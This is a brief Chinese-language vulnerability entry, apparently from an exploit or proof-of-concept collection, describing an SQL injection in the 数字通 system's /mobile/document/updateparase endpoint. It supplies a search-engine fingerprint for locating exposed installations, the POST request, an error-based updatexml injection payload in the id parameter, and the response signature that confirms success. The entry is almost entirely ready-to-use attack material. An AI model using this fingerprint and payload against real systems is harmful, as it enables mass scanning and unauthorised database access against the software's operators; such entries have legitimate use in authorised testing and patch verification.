# 数字通updateparase存在SQL注入漏洞

数字通 ｜ SQL注入 ｜ —
- **指纹**：`body="static/templates/default/skins/"`
- **请求**：`POST /mobile/document/updateparase HTTP/1.1`

**Payload**
```
id=5 or updatexml(1,concat(0x7e,md5(1),0x7e),1)
```
- **响应特征**：200 c4ca4238a0b923820dcc509a6f7584